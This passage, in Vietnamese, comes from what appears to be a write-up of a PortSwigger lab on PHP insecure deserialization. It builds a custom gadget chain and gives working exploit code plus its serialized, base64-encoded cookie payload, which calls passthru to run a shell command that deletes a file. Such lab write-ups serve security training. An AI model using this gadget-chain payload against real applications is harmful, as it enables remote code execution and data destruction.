@@ -645,6 +645,176 @@ Nhưng có nhầm khóa :)) thử mãi mới để ý là bị sai khóa:
 
 Đoạn mã sinh cookie: 
 
+![image](https://user-images.githubusercontent.com/104350480/227720110-7ca4b608-f543-44bc-a168-8a27606a0efb.png)
+
+Vậy giờ nhét lại nó vào cookie: 
+
 ![image](https://user-images.githubusercontent.com/104350480/227719970-bc623afe-23e4-4feb-8646-c9f68fa0d821.png)
 
-Vậy là giờ mới xong bài lab.
+
+## [6. Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)<a name='id6'></a>
+
+Bài này mình đọc không hiểu lắm nên có tìm hiểu và xem phân tích để hiểu:
+
+> Link reference: https://nima.ninja/blog/2023/expert-lab-developing-a-custom-gadget-chain-for-php-deserialization
+
+Mở vào ta có giao diện của bài như sau:
+
+![image](https://user-images.githubusercontent.com/104350480/227720507-292d3671-e53a-4c49-9be5-5050f6886944.png)
+
+ctrl U để lấy đường dẫn chứa source code: 
+
+> /cgi-bin/libs/CustomTemplate.php
+
+Thêm ~ để lấy file backup, ta có source code như sau: 
+
+```
+
+<?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+    public $product;
+
+    public function __construct($desc_type='HTML_DESC') {
+        $this->desc = new Description();
+        $this->default_desc_type = $desc_type;
+        // Carlos thought this is cool, having a function called in two places... What a genius
+        $this->build_product();
+    }
+
+    public function __sleep() {
+        return ["default_desc_type", "desc"];
+    }
+
+    public function __wakeup() {
+        $this->build_product();
+    }
+
+    private function build_product() {
+        $this->product = new Product($this->default_desc_type, $this->desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this->desc = $desc->$default_desc_type;
+    }
+}
+
+class Description {
+    public $HTML_DESC;
+    public $TEXT_DESC;
+
+    public function __construct() {
+        // @Carlos, what were you thinking with these descriptions? Please refactor!
+        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
+        $this->TEXT_DESC = 'This product is cool in text';
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+
+    public function __get($name) {
+        return call_user_func($this->callback, $name);
+    }
+}
+
+?>
+
+
+```
+
+Dựa vào đoạn code này và để ý phần cookie đang được serialize, ta sẽ tìm hiểu xem có cách nào khai thác lỗ hổng insecure deserialization không: 
+
+Để tạo chuỗi custom gadget, ta cần tìm ra hai gadget quan trọng: kick-off gadget và sink gadget. Kick-off gadget là gadget đầu tiên trong chuỗi, chạy trước khi các gadget khác, và nó sẽ giúp chúng ta thực hiện các lệnh mà chúng ta muốn. Sink gadget là gadget cuối cùng trong chuỗi và nó là nơi chúng ta sẽ đưa các lệnh để thực thi sau khi chuỗi gadget kết thúc.
+
+Sau khi đã xác định được kick-off gadget và sink gadget, ta sẽ kết hợp chúng với nhau để tạo thành chuỗi gadget, mà sau đó sẽ được sử dụng để thực hiện tấn công. Ở trong source code bài này, có thể thấy magic method \_\_wakeup() có lẽ phù hợp với kick-off gadget. Method này được thực thi khi một đối tượng được serialize unserialize, trong trường hợp này, có sẽ thực thi các pyalod mà chúng ta tạo phfu hợp. Theo flow của code, nó sẽ dẫn tới dòng: **$this->desc = $desc->$default_desc_type;** trong class Product constructor. 
+Ta cũng có thể tìm thấy sink gadget phù hợp ở đây là DefaultMap class có chứa **call_user_func** có thể thực thi bất kì hàm nào nếu chúng ta có thể bằng cách nào đó đưa input vào hàm này. Hàm này lấy **$this-callback** như một tham số đầu tiên và **$name** là tham số thứ 2.Trong hàm này, tham số đầu tiên sẽ là tên của bất kì hàm  php nào và tham số thứ 2 sẽ là tham số được truyền qua function, function này gọi **\_\_get()** magic method. Method này được gọi khi một thuộc tính chưa xác định của lớp DefaultMap và tên thuộc tính được gọi sẽ truyền qua tham số thứ 2 trong trường hợp cmd này được thực thi.
+Nghĩa là ở đây nếu ta có thể sử dụng sink gadget này để thực thi mã tùy ý, bằng cách lợi dụng phương thức call_user_func của class DefaultMap để gọi một hàm bất kỳ với tham số bất kỳ được truyền vào.
+
+```
+
+$callback: là một hàm hoặc phương thức mà bạn muốn gọi. Điều này có thể được chỉ định dưới dạng một chuỗi chứa tên hàm hoặc phương thức, hoặc một mảng chứa đối tượng và tên phương thức.
+Ở đây ta có thể dùng callback để gọi được passthru và thực thi một lệnh shell trong hệ thống ở tham số thứ hai.
+$parameter: là một danh sách các đối số mà bạn muốn truyền vào hàm hoặc phương thức.
+
+```
+
+Từ đoạn code này, ta có thể thực hiện rce:
+
+![image](https://user-images.githubusercontent.com/104350480/227722379-a89086c8-f70a-4691-aa0b-b72c7549c765.png)
+
+Nếu ta truyền như sau: 
+
+```
+$test = new DefaultMap('passthru');
+$cmd = 'rm /home/carlos/morale.txt';
+$test->$cmd;
+
+```
+
+Thì nó sẽ gọi phương thức \_\_get() của lớp DefaultMap, nó sẽ thực thi đoạn mã return call_user_func($this->callback, $name);. Điều này sẽ gọi hàm passthru với tham số là lệnh shell rm /home/carlos/morale.txt. Kết quả, tệp tin morale.txt trên máy chủ được thực thi bởi đoạn mã này sẽ bị xóa đi.
+
+Giờ ta cần kết hợp giữa kick-off gadget và sink gadget lại với nhau:
+
+> $this->desc = new DefaultMap('passthru');
+
+Ta sẽ gán tiếp như sau: 
+Thuộc tính $this->default_desc_type được gán giá trị là rm /home/carlos/morale.txt. Nói cách khác, đối tượng $this->desc được khởi tạo để sử dụng hàm passthru và giá trị $this->default_desc_type được sử dụng để thực thi lệnh shell rm /home/carlos/morale.txt.
+
+Sau đó, ta đến phần khởi tạo của class Product, trong đó đối tượng $this->desc và giá trị $this->default_desc_type được truyền vào như tham số của hàm khởi tạo. Hàm khởi tạo này sẽ gán giá trị của $desc->$default_desc_type cho thuộc tính $this->desc của class Product.
+
+Điều này có nghĩa là khi chúng ta khởi tạo một đối tượng Product, nó sẽ kế thừa giá trị $this->desc và $this->default_desc_type từ đối tượng $this->desc và $this->default_desc_type của class DefaultMap. Và khi chúng ta gọi phương thức \_\_get() của đối tượng $test với tên thuộc tính là biến $cmd, nó sẽ thực thi lệnh shell rm /home/carlos/morale.txt thông qua đối tượng Product
+
+Ở đây ta có thể dùng đoạn code sau: 
+
+```
+<?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+
+    public function __construct() {
+        $this->desc = new DefaultMap('passthru');
+        $this->default_desc_type = 'rm /home/carlos/morale.txt';
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+}
+
+$test = new CustomTemplate();
+$ser = serialize($test);
+echo($ser . "\n");
+echo("===================================================\n");
+echo("base64 endcoded then urlencoded: \n");
+echo(urlencode(base64_encode($ser)) . "\n");
+
+```
+và output của nó sẽ là:
+
+```
+O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:8:"passthru";}}
+===================================================
+base64 encoded then urlencoded: 
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo4OiJwYXNzdGhydSI7fX0%3D
+
+```
+Ta truyền base64 urlencoded trên vào cookie và để nó thực hiện:
+
+![image](https://user-images.githubusercontent.com/104350480/227723227-12897bd5-3dd5-4399-92da-67305c1e18db.png)
